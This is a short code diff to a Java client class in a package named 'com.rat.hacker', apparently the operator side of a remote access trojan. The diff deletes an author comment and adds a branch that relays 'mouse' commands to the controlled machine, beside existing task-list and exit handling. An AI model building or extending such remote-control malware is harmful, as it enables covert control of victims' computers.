@@ -1,10 +1,5 @@
 package com.rat.hacker;
 
-/**
- * @author Bar771
- * https://Bar771.tumblr.com
- */
-
 import java.net.Socket;
 import java.awt.image.BufferedImage;
 import java.io.BufferedReader;
@@ -80,6 +75,10 @@ public class Client extends Thread{
 					
 					String line = in.readLine();
 					System.out.println("[Server] TaskList:\n" + line);
+				}
+				else if (cmd.startsWith("mouse") && cmd.split(" ").length > 1) {
+					out.println(cmd);
+					out.flush();
 				}
 				else if(cmd.startsWith("exit")) {
 					out.println(cmd);
